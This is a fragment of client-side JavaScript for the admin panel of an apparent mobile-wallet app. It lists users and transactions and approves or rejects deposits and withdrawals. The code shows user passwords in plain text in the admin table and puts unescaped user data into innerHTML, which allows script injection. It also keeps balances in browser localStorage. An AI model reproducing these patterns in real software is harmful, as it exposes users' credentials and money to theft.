        let photoHtml = `<div style="width:30px; height:30px; border-radius:50%; background:#334155; display:flex; align-items:center; justify-content:center; font-size:13px;">👤</div>`;
        if (u.photo) {
            photoHtml = `<img src="${u.photo}" style="width:30px; height:30px; border-radius:50%; object-fit:cover; border:1px solid #f59e0b;">`;
        }

        tr.innerHTML = `
            <td>${photoHtml}</td>
            <td><b>${nameVal}</b></td>
            <td>${contactVal}</td>
            <td><b style="color:#f59e0b;">${curr}</b></td>
            <td style="color:#f43f5e;"><code>${passVal}</code></td>
            <td style="color:#38bdf8;"><b>${curr} ${formatAmountLocale(mainBal)}</b></td>
            <td style="color:#a855f7;"><b>${curr} ${formatAmountLocale(limitBal)}</b></td>
            <td>
                <button onclick="adminDeleteUser('${identifier}')" class="btn-delete-user">Delete & Ban</button>
            </td>
        `;
        tbody.appendChild(tr);
    });
}

function renderAdminPendingList() {
    const tbody = document.getElementById('adminPendingTableBody');
    if (!tbody) return;
    tbody.innerHTML = '';

    const pendingTxs = allTransactions.filter(t => t.status === 'Pending');

    if (pendingTxs.length === 0) {
        tbody.innerHTML = `<tr><td colspan="7" style="text-align:center; color:#94a3b8;">No pending requests.</td></tr>`;
        return;
    }

    pendingTxs.forEach(t => {
        const tr = document.createElement('tr');
        const curr = t.currency || '৳';

        tr.innerHTML = `
            <td><b>${t.userName || t.userEmail || 'User'}</b></td>
            <td style="color:#f59e0b;"><b>${t.type}</b></td>
            <td>${t.method}</td>
            <td>${t.phone}</td>
            <td style="color:#38bdf8;"><b>${curr} ${formatAmountLocale(t.amount)}</b></td>
            <td><code>${t.trxId}</code></td>
            <td>
                <button onclick="approveTransaction(${t.id})" class="btn-approve">Approve</button>
                <button onclick="rejectTransaction(${t.id})" class="btn-reject">Reject</button>
            </td>
        `;
        tbody.appendChild(tr);
    });
}

function renderAdminAllHistory() {
    const tbody = document.getElementById('adminAllHistoryTableBody');
    if (!tbody) return;
    tbody.innerHTML = '';

    if (allTransactions.length === 0) {
        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#94a3b8;">No transaction history.</td></tr>`;
        return;
    }

    allTransactions.forEach(t => {
        let statusBadge = `<span class="status-pending">Pending ⏳</span>`;
        if (t.status === 'Approved') statusBadge = `<span class="status-approved">Approved ✅</span>`;
        if (t.status === 'Rejected') statusBadge = `<span class="status-rejected">Rejected ❌</span>`;

        const curr = t.currency || '৳';
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td><b>${t.userName || t.userEmail || 'User'}</b></td>
            <td>${t.type}</td>
            <td>${t.method}</td>
            <td>${curr} ${formatAmountLocale(t.amount)}</td>
            <td><code>${t.trxId}</code></td>
            <td>${statusBadge}</td>
        `;
        tbody.appendChild(tr);
    });
}

async function approveTransaction(txId) {
    const txIndex = allTransactions.findIndex(t => t.id === txId);
    if (txIndex === -1) return;

    const tx = allTransactions[txIndex];
    const userIndex = usersDatabase.findIndex(u => u.phone === tx.userEmail || u.email === tx.userEmail);

    if (userIndex !== -1) {
        const targetUser = usersDatabase[userIndex];
        if (!targetUser.balances) targetUser.balances = { ...defaultBalances };
        if (targetUser.totalBalance === undefined) targetUser.totalBalance = 0.00;

        if (tx.type === 'Withdraw' || tx.type === 'TopUp' || tx.type === 'Remittance/Bank') {
            targetUser.totalBalance -= tx.amount;
        } else if (tx.type === 'Deposit') {
            targetUser.totalBalance += tx.amount;
        }

        usersDatabase[userIndex] = targetUser;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        await saveUserToFirebase(targetUser);

        allTransactions[txIndex].status = 'Approved';
        localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
        await saveTxToFirebase(allTransactions[txIndex]);

        const curr = getUserCurrency(targetUser);
        sendTelegramNotification(`✅ <b>Transaction Approved!</b>\n\n👤 User: ${tx.userName}\n💰 Amount: ${curr}${tx.amount}`);

        showCustomAlert("Success", 'Transaction approved successfully!');

        if (activeUser && (activeUser.phone === targetUser.phone || activeUser.email === targetUser.email)) {
            activeUser = targetUser;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
            renderBalances();
        }

        renderAdminPendingList();
        renderAdminUsersList();
        renderAdminAllHistory();
    }
}

async function rejectTransaction(txId) {
    const txIndex = allTransactions.findIndex(t => t.id === txId);
    if (txIndex !== -1) {
        allTransactions[txIndex].status = 'Rejected';
        localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
        await saveTxToFirebase(allTransactions[txIndex]);

        showCustomAlert("Success", 'Request rejected.');

        renderAdminPendingList();
        renderAdminAllHistory();
    }
}
